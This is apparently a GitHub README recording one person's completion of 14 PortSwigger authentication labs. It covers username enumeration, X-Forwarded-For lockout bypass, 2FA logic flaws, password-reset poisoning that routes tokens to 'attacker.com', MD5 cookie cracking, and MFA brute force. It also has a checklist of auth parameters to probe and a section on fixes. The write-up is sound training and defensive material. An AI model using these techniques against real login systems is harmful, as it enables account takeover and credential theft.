# 🔐 Authentication Vulnerabilities — Complete Lab Series

<div align="center">

![Category](https://img.shields.io/badge/Category-Authentication%20Security-critical?style=for-the-badge&logo=shield&logoColor=white)
![Labs Completed](https://img.shields.io/badge/Labs%20Completed-14%2F14-success?style=for-the-badge&logo=checkmarx&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Expert-orange?style=for-the-badge&logo=target&logoColor=white)
![Status](https://img.shields.io/badge/Status-100%25%20Complete-brightgreen?style=for-the-badge&logo=statuspage&logoColor=white)

**14 labs. Apprentice through Expert. All done.**

[![🔗 Main Repository](https://img.shields.io/badge/🔗%20Main%20Repository-black?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) [![👤 About Me](https://img.shields.io/badge/👤%20About%20Me-5865F2?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security)  [![📧 Contact](https://img.shields.io/badge/📧%20Contact-E8562A?style=for-the-badge)](mailto:gskhalsa6245@gmail.com)

</div>

---

Finished all 14 PortSwigger authentication labs. Notes below are what I actually did — not rephrased documentation. The attack pattern section at the bottom is what I kept open while working through the harder labs.

**Time spent:** ~40 hours  
**Tools:** Burp Suite Pro, Turbo Intruder, Python, Hashcat  
**Focus areas:** Enumeration, brute force bypass, MFA logic, session attacks, password reset flaws

---

## Labs

### Apprentice — 3/3

Short labs but don't skip them. Lab 2 especially — the 2FA bypass is embarrassingly simple and you'll see variants of it in real apps more than you'd expect.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 1 | [Username Enumeration via Different Responses](./LAB-1-AUTHENTICATION.md) | Login returns different messages for invalid username vs wrong password. Ran Intruder over a username wordlist, filtered on response length. Valid usernames stuck out immediately — different message, different length. Then brute-forced the password the same way. | Enumeration |
| 2 | [2FA Simple Bypass](./LAB-2-AUTHENTICATION.md) | After login you get redirected to `/login2` for the MFA code. Just navigated directly to `/my-account` instead. App had already set the session after step 1 — MFA was never enforced server-side. | MFA Bypass |
| 3 | [Password Reset Broken Logic](./LAB-3-AUTHENTICATION.md) | Reset flow sends a token in the POST body. Removed the token parameter entirely, changed the username to the victim's. App reset the password anyway — it wasn't actually validating the token against the account. | Reset Logic |

---

### Practitioner — 9/9

This is where it gets more involved. Labs 5, 8, 11, and 14 took the most time — all required understanding how the app's session or trust logic worked before the actual exploitation made sense.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 4 | [Username Enumeration via Subtly Different Responses](./LAB-4-AUTHENTICATION.md) | Same idea as Lab 1 but the difference is a single character — trailing period in the error message for invalid usernames (`Invalid username or password.` vs `Invalid username or password`). Used Burp's Grep Match to flag it. Easy to miss manually. | Enumeration |
| 5 | [Username Enumeration via Response Timing](./LAB-5-AUTHENTICATION.md) | App locks out by IP after a few attempts. Bypassed with `X-Forwarded-For` header — rotating the value on each request makes the server think you're coming from a new IP. Valid usernames take longer to respond because the app actually checks the password hash. Sent a very long password to amplify the timing difference. Identified the valid username from the slowest response, then brute-forced the password. | Timing + Rate Bypass |
| 6 | [Broken Brute-Force Protection (IP Block)](./LAB-6-AUTHENTICATION.md) | Lockout triggers after 3 failed attempts. Reset by logging into my own account successfully between attempts — the counter resets on valid login. Set up a Turbo Intruder script that interleaved my valid credentials with victim password guesses. Two invalid, one valid, repeat. Never hit lockout. | Brute Force Bypass |
| 7 | [Username Enumeration via Account Lock](./LAB-7-AUTHENTICATION.md) | No lockout on invalid usernames — only valid ones get locked. Ran Cluster Bomb with multiple passwords per username. The one username that eventually returned an account locked message was the valid one. Waited for lockout to clear, then brute-forced the password. | Enumeration via Lockout |
| 8 | [2FA Broken Logic](./LAB-8-AUTHENTICATION.md) | The `verify` cookie controls which account the MFA code gets issued for. Logged in with my account, intercepted the MFA request, changed `verify=wiener` to `verify=carlos`. That triggers a new MFA code for the victim's account. Then brute-forced the 4-digit code in Intruder — got a 302 when the code matched. Swapped the session token into my browser. | MFA Logic Flaw |
| 9 | [Brute-Forcing Stay-Logged-In Cookie](./LAB-9-AUTHENTICATION.md) | Cookie was `base64(username:md5(password))`. Decoded mine, confirmed the format. Set the username to the victim's, generated MD5 hashes for each password in the wordlist, base64'd them, ran Intruder. Matched on a 200 response. | Session Cookie Attack |
| 10 | [Offline Password Cracking](./LAB-10-AUTHENTICATION.md) | Same weak cookie format as Lab 9. Found an XSS in a comment field. Injected a payload to exfiltrate the victim's stay-logged-in cookie to my exploit server. Decoded it, extracted the MD5 hash, cracked it with Hashcat. Logged in with the plaintext password. | XSS + Cryptanalysis |
| 11 | [Password Reset Poisoning via Middleware](./LAB-11-AUTHENTICATION.md) | Reset email generates a link using the `Host` header value. Added `X-Forwarded-Host: my-exploit-server.com` to the reset request. The app used that header to build the reset URL and sent it to the victim. Victim clicks — token hits my server. Used the captured token to reset the victim's password. | Host Header Injection |
| 12 | [Password Brute-Force via Password Change](./LAB-12-AUTHENTICATION.md) | Password change endpoint behaved differently when the current password was wrong vs right — different error message. No rate limiting on this endpoint either. Set the username to the victim's in the request, brute-forced current password through Intruder, filtered on the response that indicated a correct current password. | Logic Flaw + Brute Force |

---

### Expert — 2/2

Both of these are less about clever payloads and more about understanding the underlying mechanism — session binding in 14, JSON parsing behaviour in 13.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 13 | [Broken Brute-Force Protection (Multiple Credentials)](./LAB-13-AUTHENTICATION.md) | Login accepts JSON. Instead of one password string, passed an array of passwords: `"password": ["pass1","pass2",...]`. The backend iterated through all of them and returned a session token if any matched. Got a valid session in one request. | JSON Array Injection |
| 14 | [2FA Bypass Using Brute-Force Attack](./LAB-14-AUTHENTICATION.md) | MFA page uses a CSRF token that's tied to the session, which resets after each failed attempt. Needed a macro to re-run the full login flow before every MFA guess — GET /login, POST /login, POST /login2 (dummy MFA entry to get a fresh CSRF token). Configured the macro in Burp's session handling rules, then ran Intruder over all 0000–9999 codes. When the right code hit, got a valid session. Replaced the session in my browser. | Macro + MFA Brute Force |

---

## Attack Patterns

### Username Enumeration

The app is leaking whether a username exists through its response — could be the message text, response length, status code, or timing. Any difference is an oracle.

```http
POST /login
username=validuser&password=wrong
→ "Incorrect password"          ← username exists

POST /login
username=doesnotexist&password=wrong
→ "Invalid username or password" ← username doesn't exist
```

Burp Intruder workflow: mark the username position, load a wordlist, grep for the distinguishing string or filter on response length.

---

### Rate Limit Bypass via Header Spoofing

IP-based lockout trusts `X-Forwarded-For`. Rotate it on every request and the server thinks each attempt comes from a new IP.

```http
POST /login
X-Forwarded-For: 10.0.0.1
username=carlos&password=attempt1

POST /login
X-Forwarded-For: 10.0.0.2
username=carlos&password=attempt2
```

Worth pairing with a valid login interleaved between attempts if the counter is per-IP but still resets on success.

---

### 2FA Logic Flaws

**Type A — skip it entirely:**
```
POST /login → redirect to /login2 → navigate directly to /my-account
Session is already set after step 1. MFA check is client-enforced only.
```

**Type B — target a different account:**
```http
GET /login2
Cookie: verify=wiener   → change to verify=carlos
```
Triggers MFA code issuance for the victim. Brute-force the 4-digit code (10,000 max attempts).

---

### Password Reset Flaws

**Token not bound to account:**
```http
POST /reset-password
token=abc123&username=wiener&new-password=hacked
→ change username to carlos → resets carlos's password
```

**Host header poisoning:**
```http
POST /forgot-password
Host: vulnerable-site.com
X-Forwarded-Host: attacker.com

→ Reset email contains: https://attacker.com/reset?token=...
→ Victim clicks → token captured
```

---

### Weak Session Cookie

```
stay-logged-in cookie = base64(username:md5(password))

Decode → extract MD5 → crack offline → reconstruct cookie for victim
```

Hashcat: `hashcat -a 0 -m 0 hash.txt wordlist.txt`

---

### JSON Array Credential Stuffing

```json
{
  "username": "carlos",
  "password": ["password1", "password2", "password3", "..."]
}
```

If the backend iterates the array and returns a session on any match, you can test hundreds of passwords in a single request — no rate limiting triggered.

---

### Macro-Based MFA Brute Force

When the MFA session resets after each failure, you need Burp macros to re-authenticate before every guess:

```
Macro sequence:
1. GET /login        → capture CSRF token
2. POST /login       → authenticate, get session
3. POST /login2      → submit dummy code, get fresh MFA CSRF token
4. POST /login2      → submit actual guess (Intruder payload)
```

Set up in Burp: Project Options → Sessions → Session Handling Rules → Add macro.

---

## DB Reference

### Response Differences to Look For

| Signal | Tool | How to Use |
|--------|------|-----------|
| Message text | Grep Match | Flag specific string presence/absence |
| Response length | Column filter | Sort by length, outliers = valid |
| Status code | Filter | 200 vs 302 vs 403 |
| Response time | Sort by time | Slower = valid username (timing attack) |

### Encoding Reference

| Format | Example | Tool |
|--------|---------|------|
| Base64 | `d2llbmVyOjUxZGMz` | Burp Decoder |
| MD5 | `51dc30ddc473d43a` | Hashcat `-m 0` |
| Base64(user:md5) | stay-logged-in cookie format | Decoder → crack → reconstruct |

---

## Possible Parameters in Modern Security

Where authentication vulnerabilities realistically appear in modern applications, APIs, and infrastructure. These are the parameters and input points worth checking specifically when testing auth flows.

### Login & Session Parameters

| Parameter | Context | What to test |
|-----------|---------|--------------|
| `username`, `email`, `login` | Login forms, API auth endpoints | Enumeration via response differences, timing |
| `password`, `passwd`, `pass` | Login, password change, reset forms | Brute force, credential stuffing |
| `remember_me`, `stay_logged_in`, `persistent` | Session persistence toggles | Cookie format analysis, predictable token generation |
| `session`, `token`, `auth`, `sid` | Cookie values, Authorization headers | Token prediction, weak encoding, reuse |
| `mfa_code`, `otp`, `totp_code`, `verification_code` | MFA verification endpoints | Brute force, code reuse, binding check |
| `verify`, `account`, `user_id` | MFA session binding | Change to another user's identifier |
| `redirect`, `next`, `return_to`, `continue` | Post-login redirect | Open redirect chaining after auth bypass |

---

### Password Reset Parameters

| Parameter | Context | What to test |
|-----------|---------|--------------|
| `token`, `reset_token`, `key` | Reset links and POST bodies | Token bound to account? Reusable? Predictable? |
| `username`, `email` | Reset request body | Tamper to target another account |
| `new_password`, `confirm_password` | Reset confirmation | Is the token actually validated before accepting? |
| `Host`, `X-Forwarded-Host`, `X-Host` | Request headers on reset endpoint | Host header injection → poisoned reset link |
| `X-Forwarded-For`, `X-Real-IP` | IP-based rate limiting on resets | Bypass attempt limits |

---

### Modern API Authentication

| Surface | Parameter / Header | What to test |
|---------|--------------------|--------------|
| REST APIs | `Authorization: Bearer <token>` | Token expiry, signature validation, algorithm confusion |
| REST APIs | `api_key`, `access_token`, `client_secret` | Key reuse across environments, predictable generation |
| GraphQL | `operationName`, inline credentials in query body | Auth applied per-resolver or globally? |
| OAuth flows | `code`, `state`, `redirect_uri` | CSRF on state, redirect_uri manipulation, code reuse |
| OAuth flows | `client_id`, `client_secret` | Exposed in frontend code, mobile app binaries |
| JWT | `alg`, `kid`, header claims | `alg: none`, RS256 → HS256 confusion, kid injection |
| SSO / SAML | `SAMLResponse`, `RelayState` | Signature wrapping, replay, XML injection |
| WebSockets | Auth token in connection URL or first message | Token logged in access logs, reusable after logout |

---

### Session Management in Modern Stacks

| Stack / Framework | Where to look | What to test |
|-------------------|--------------|--------------|
| Next.js / Vercel | `__Secure-next-auth.session-token` | Predictable secret, missing HttpOnly/Secure flags |
| Django | `sessionid` cookie | SECRET_KEY weak or leaked, session fixation |
| Laravel | `laravel_session` cookie | APP_KEY exposed, cookie not invalidated on logout |
| Rails | `_session_id` cookie | Session not rotated on privilege change |
| Node.js + Express | `connect.sid` | Session secret hardcoded, weak randomness |
| Firebase Auth | `idToken`, `refreshToken` | Refresh token not revoked on password change |
| AWS Cognito | `id_token`, `access_token`, `refresh_token` | Token leakage in URL, missing token binding |
| Mobile apps | Tokens stored in SharedPreferences / NSUserDefaults | Extractable without root on some devices |

---

### Infrastructure & Internal Systems

| System | Auth Parameter | What to test |
|--------|---------------|--------------|
| Admin panels (`/admin`, `/dashboard`) | Session cookie, basic auth header | Default credentials, session not expiring |
| CI/CD (Jenkins, GitLab, GitHub Actions) | `PRIVATE_TOKEN`, `CI_JOB_TOKEN` | Tokens in logs, overprivileged scope |
| Cloud consoles (AWS, GCP, Azure) | IAM tokens, metadata service credentials | SSRF to metadata endpoint → credential theft |
| Internal APIs (no WAF) | Any auth header or cookie | Relaxed validation, missing rate limiting |
| Kubernetes dashboards | `Bearer` token, kubeconfig | Unauthenticated access, overpermissioned service accounts |
| Git repositories | `.env`, `config.yml`, `secrets.yml` | Hardcoded credentials, tokens committed to history |

---

### Headers That Affect Auth Behavior

These aren't body parameters but directly influence how authentication logic executes on the server side.

```
X-Forwarded-For       → IP-based rate limiting and lockout bypass
X-Forwarded-Host      → Password reset link generation, redirect construction
X-Original-URL        → Access control bypass on some reverse proxies
X-Rewrite-URL         → Same as above on different stacks
X-Custom-IP-Auth      → Some internal apps trust this for IP allowlisting
Authorization         → Bearer token, Basic auth — test algorithm, encoding, expiry
Cookie                → Session binding, MFA binding, remember-me token format
Origin                → CORS misconfiguration enabling cross-origin auth requests
Referer               → Some apps validate Referer for CSRF — predictable bypass
```

---

## Fix

The recurring theme across all 14 labs: the app made security decisions based on data it shouldn't have trusted — client-controlled cookies, headers, request parameters, response timing side-channels it never thought about.

**Enumeration:** Return the same message for every failed login. Enforce the same timing regardless of whether the username exists (use constant-time comparison).

**Rate limiting:** Enforce server-side per-account, not per-IP. Never trust `X-Forwarded-For` for security decisions unless you control every proxy in the chain.

**MFA:** Bind the MFA state to the session server-side. Enforce it — don't just redirect to `/login2` and hope the user doesn't skip it. Limit attempts (3-5) and expire codes fast (60-90 seconds).

**Password reset:** Generate cryptographically random tokens (`secrets.token_urlsafe(32)`), bind them to the account server-side, expire them in under an hour, invalidate on use. Never use the `Host` header to construct URLs in emails — hardcode your domain.

**Session cookies:** Use cryptographically random values. Never encode credentials or hashes into cookies. `secrets.token_urlsafe(64)`, HttpOnly, Secure, SameSite=Strict.

---

## Tools

| Tool | What I used it for |
|------|--------------------|
| Burp Suite Pro | Everything — Repeater, Intruder, session macros |
| Turbo Intruder | Lab 6 — needed better control over request interleaving than standard Intruder |
| Hashcat | Labs 9, 10 — MD5 cracking from the weak session cookies |
| Python | One-off scripts for cookie generation in Labs 9/10 |

---

## Lab Order

Do them in order. Labs 1–3 are fast but Lab 2's MFA bypass sets up the mental model for Lab 8 and 14. Lab 5's timing attack builds on Lab 1's enumeration concept. Lab 10 only makes sense if you've done Lab 9 first.

The jump from Practitioner to Expert isn't as big as it looks — Lab 13 is actually simpler than several Practitioner labs. Lab 14 is the hardest one in the series, mostly because of the macro setup.

---

## Completion

- [x] Lab 1 — Username Enumeration via Different Responses
- [x] Lab 2 — 2FA Simple Bypass
- [x] Lab 3 — Password Reset Broken Logic
- [x] Lab 4 — Username Enumeration via Subtly Different Responses
- [x] Lab 5 — Username Enumeration via Response Timing
- [x] Lab 6 — Broken Brute-Force Protection (IP Block)
- [x] Lab 7 — Username Enumeration via Account Lock
- [x] Lab 8 — 2FA Broken Logic
- [x] Lab 9 — Brute-Forcing Stay-Logged-In Cookie
- [x] Lab 10 — Offline Password Cracking
- [x] Lab 11 — Password Reset Poisoning via Middleware
- [x] Lab 12 — Password Brute-Force via Password Change
- [x] Lab 13 — Broken Brute-Force Protection (Multiple Credentials)
- [x] Lab 14 — 2FA Bypass Using Brute-Force Attack

---

## Resources

- [PortSwigger Authentication Labs](https://portswigger.net/web-security/authentication)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html) — the actual standard for digital identity
- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) — worth reading before Lab 6

Other series in this repo:
- [OS Command Injection](../OS-Command-Injection/) — 5 labs done
- [Web Cache Deception](../web-cache-deception/) — 5 labs done
- SQL Injection — in progress
- XSS — in progress

---

## Legal

Done entirely on PortSwigger Academy's lab environment. Using any of this against systems you don't own or don't have written permission to test is illegal and I wouldn't document it if I had.

---

<div align="center">

### Gurpreet Singh | Offensive Security Researcher

[![EMAIL](https://img.shields.io/badge/EMAIL-GSKHALSA6245%40GMAIL.COM-EA4335?style=for-the-badge&logo=gmail&logoColor=white)](mailto:gskhalsa6245@gmail.com)

[![GITHUB](https://img.shields.io/badge/GITHUB-GURPREET--SINGH--OFFENSIVE--SECURITY-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) [![LINKEDIN](https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/gurpreetsingh-security)

**CC BY-NC-ND 4.0 — © 2025 Gurpreet Singh**

</div>
